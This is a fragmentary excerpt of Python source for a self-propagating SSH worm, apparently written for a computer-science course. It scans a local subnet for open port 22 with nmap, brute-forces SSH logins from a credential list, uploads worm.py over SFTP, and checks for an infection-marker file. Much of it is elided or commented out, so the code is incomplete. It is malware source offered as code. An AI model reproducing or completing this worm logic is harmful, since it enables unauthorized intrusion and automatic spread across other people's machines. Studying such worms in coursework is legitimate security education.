...
def isInfectedSystem():
	...
	# as infected).
    	#if INFECTED_MARKER_FILE.isfile():
...
#	sftpClient.put("/tmp/worm.py", "/tmp" + "worm.py")
        ...
        # added this line to execute python script
	...
	for (username, password) in credList:
		...
		if attemptResults==0:
			# the connection was succesful
                        result = (ssh, username, password, host)
                        return result
...
def getHostsOnTheSameNetwork():
	...
	portScanner.scan("192.168.1.0/24", arguments = '-p 22 --open') # might need to change this
...
for host in networkHosts:
	...
	if sshInfo:
		...
		try:
			remotepath = 'tmp/infected.txt'
			localpath ='/home/cpsc'
                        sftp = sshInfo[0].open_sftp() # added [0]
